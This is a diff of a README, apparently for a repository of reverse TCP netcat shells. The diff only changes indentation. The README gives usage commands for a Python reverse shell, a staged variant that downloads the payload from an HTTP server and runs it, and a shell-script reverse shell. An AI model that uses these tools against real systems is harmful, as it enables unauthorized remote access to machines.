@@ -29,11 +29,11 @@ The following repository contains multiple versions of a reverse tcp netcat shel
     python3 reverse_tcp.py [callback_ip] [port]
   
   # Staged Python Shell
-    If you wish to run a staged shell you must first host the "reverse_tcp.py" payload on a HTTP server and you must configure its default callback address
+  If you wish to run a staged shell you must first host the "reverse_tcp.py" payload on a HTTP server and you must configure its default callback address
 
-    to call a staged shell run the following command:
+  to call a staged shell run the following command:
 
-      python3 reverse_tcp_staged.py http://[HTTPSERVER]/[route to reverse_tcp.py]
+    python3 reverse_tcp_staged.py http://[HTTPSERVER]/[route to reverse_tcp.py]
   
 # Shell Script Reverse Shell
   This should be the most effective as it should run on all targets and is in fact the smallest payload
